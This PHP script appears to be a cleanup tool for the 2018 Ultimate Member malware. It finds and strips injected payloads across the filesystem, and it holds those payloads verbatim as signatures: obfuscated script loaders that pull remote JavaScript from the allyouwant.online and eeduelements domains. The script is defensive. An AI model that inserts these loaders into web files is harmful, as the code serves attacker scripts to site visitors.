<?php

// This file try to clean all infected files from Ultimate member malware from August 2018

echo "Cleaning Launched...<br/><br/>";

/* Clean injection in files named like *head* or contains <head */
$a = 'find / -type f -name "*head*" | xargs grep -rl "<head"';
$l1 = "<script type='text/javascript' src='https://cdn.allyouwant.online/main.js?t=lp1'></script>";
$l2 = "<script type='text/javascript' src='https://cdn.eeduelements.com/jquery.js?ver=1.0.8'></script>";
$l3 = "<script type='text/javascript' src='https://cdn.allyouwant.online/main.js?t=rp1'>";
$l4 = "<script type='text/javascript' src='https://cdn.allyouwant.online/main.js?t=nplp1'></script>";
$t = shell_exec($a);
$t = explode("\n", trim($t));
foreach($t as $f){
	$g = file_get_contents($f);
	if ((strpos($g, 'eeduelements') !== false) OR ((strpos($g, 'allyouwant.online') !== false))) { 
		$g = file_get_contents($f);
		$g = str_replace($l1, "" ,$g);//Remplace infected chain by null
		$g = str_replace($l2, "" ,$g);//Remplace infected chain by null
		$g = str_replace($l3, "" ,$g);//Remplace infected chain by null
		$g = str_replace($l4, "" ,$g);//Remplace infected chain by null
		@system("chmod 644 ".$f);//Replace chmod by 644
		@file_put_contents($f,$g);//Replace infected file by cleaned file
		echo "cleaned <i style='color:green'>header</i> :".$f."<br/><br/>";
	}
}

/* Clean injection in *index.php* files */
$a = 'find / -type f -name "*index.php*"';
$l1="error_reporting(0); ini_set(chr(100).chr(105).chr(115).chr(112).chr(108).chr(97).chr(121).chr(95).chr(101).chr(114).chr(114).chr(111).chr(114).chr(115), 0); echo @file_get_contents(chr(104).chr(116).chr(116).chr(112).chr(115).chr(58).chr(47).chr(47).chr(97).chr(108).chr(115).chr(117).chr(116).chr(114).chr(97).chr(110).chr(115).chr(46).chr(99).chr(111).chr(109).chr(47).chr(115).chr(116).chr(97).chr(116).chr(115).chr(46).chr(106).chr(115));";
$t = shell_exec($a);
$t = explode("\n", trim($t));
foreach($t as $f){
	//echo "NOT cleaned <i style='color:blue'>index.php</i>:".$f."<br/><br/>";
	@system("chmod 644 ".$f);//Replace chmod by 644
	$g = file_get_contents($f);
	if (strpos($g, 'error_reporting(0); ini_set(chr(100).chr(105).chr(115).chr(112).chr(108).chr(97).chr(121).chr(95).chr(101).chr(114).chr(114).chr(111).chr(114).chr(115), 0); echo @file_get_contents(chr(104).chr(116).chr(116).chr(112).chr(115).chr(58).chr(47).chr(47).chr(97).chr(108).chr(115).chr(117).chr(116).chr(114).chr(97).chr(110).chr(115).chr(46).chr(99).chr(111).chr(109).chr(47).chr(115).chr(116).chr(97).chr(116).chr(115).chr(46).chr(106).chr(115));') !== false) { 
		$g = file_get_contents($f);
		$g = str_replace($l1, "" ,$g);//Remplace infected chain by null
		@file_put_contents($f,$g);//Replace infected file by cleaned file
		echo "cleaned <i style='color:blue'>index.php</i>:".$f."<br/><br/>";
	}
}

/* Clean injection in files named like *jquery* or contains jQuery */
$a = 'find / -type f -name "*jquery*" | xargs grep -rl "jQuery"';
$l1="var po = document.createElement('script'); po.type = 'text/javascript'; po.src = String.fromCharCode(104, 116, 116, 112, 115, 58, 47, 47, 99, 100, 110, 46, 97, 108, 108, 121, 111, 117, 119, 97, 110, 116, 46, 111, 110, 108, 105, 110, 101, 47, 109, 97, 105, 110, 46, 106, 115, 63, 116, 61, 106, 108, 99); var scripts = document.getElementsByTagName('script'); 
var need_t = true; for (var i = scripts.length; i--;) {if (scripts[i].src == po.src) { need_t = false;}else{} } if(need_t == true){document.head.appendChild(po);}";
$l2="var po = document.createElement('script'); po.type = 'text/javascript'; po.src = String.fromCharCode(104, 116, 116, 112, 115, 58, 47, 47, 99, 100, 110, 46, 97, 108, 108, 121, 111, 117, 119, 97, 110, 116, 46, 111, 110, 108, 105, 110, 101, 47, 109, 97, 105, 110, 46, 106, 115, 63, 116, 61, 110, 112, 106, 108, 99); var scripts = document.getElementsByTagName('script'); 
var need_t = true; for (var i = scripts.length; i--;) {if (scripts[i].src == po.src) { need_t = false;}else{} } if(need_t == true){document.head.appendChild(po);}";
$t = shell_exec($a);
$t = explode("\n", trim($t));
foreach($t as $f){
	$g = file_get_contents($f);
	if (strpos($g, "var po = document.createElement('script'); po.type = 'text/javascript'; po.src = String.fromCharCode") !== false) { 
		$g = file_get_contents($f);
		$g = str_replace($l1, "" ,$g);//Remplace infected chain by null
		$g = str_replace($l2, "" ,$g);//Remplace infected chain by null
		@system("chmod 644 ".$f);//Replace chmod by 644
		@file_put_contents($f,$g);//Replace infected file by cleaned file
		echo "cleaned <i style='color:lightblue'>jquery</i>:".$f."<br/><br/>";
	}
}

/*  End of cleaning */
/* ---------------- */

/* Search of other potentially infected files, by similar tag */



/* Search potential injection in files named like *head* or contains <head */

$i=0;
$a = 'find / -type f -name "*head*" | xargs grep -rl "<head"';
$t = shell_exec($a);
$t = explode("\n", trim($t));
foreach($t as $f){
	$g = file_get_contents($f);
	if ((strpos($g, 'eeduelements') !== false) OR ((strpos($g, 'allyouwant.online') !== false))) { 
		echo "Potentially infected <i style='color:orange'>header</i> :".$f."<br/><br/>"; $i++;
	}
}
echo "<p>Potentially infected head files (search term : 'eeduelements' and 'allyouwant.online') : ".$i."</p>";

/* Search potential injection in files named index.php */
$i=0;
$a = 'find / -type f -name "*index.php*"';
$t = shell_exec($a);
$t = explode("\n", trim($t));
foreach($t as $f){
	$g = file_get_contents($f);
	if (strpos($g, 'error_reporting(0); ini_set(chr(') !== false) { 
		echo "Potentially infected <i style='color:orange'>index.php</i> :".$f."<br/><br/>"; $i++;
	}
}

echo "<p>Potentially infected index.php files (search term : 'error_reporting(0); ini_set(chr(') : ".$i."</p>";

/* Search potential injection in jquery files */
$i=0;
$a = 'find / -type f -name "*jquery*" | xargs grep -rl "jQuery"';
$t = shell_exec($a);
$t = explode("\n", trim($t));
foreach($t as $f){
	$g = file_get_contents($f);
	if (strpos($g, "var po = document.createElement('script'); po.type = 'text/javascript'; po.src = String.fromCharCode") !== false) { 
		echo "Potentially infected <i style='color:orange'>index.php</i> :".$f."<br/><br/>"; $i++;
	}
}

echo "<p>Potentially infected jquery files (search term : 'var po = document.createElement('script'); po.type = 'text/javascript'; po.src = String.fromCharCode') : ".$i."</p>";


echo "<p>No more infected files detected.</p>";
?>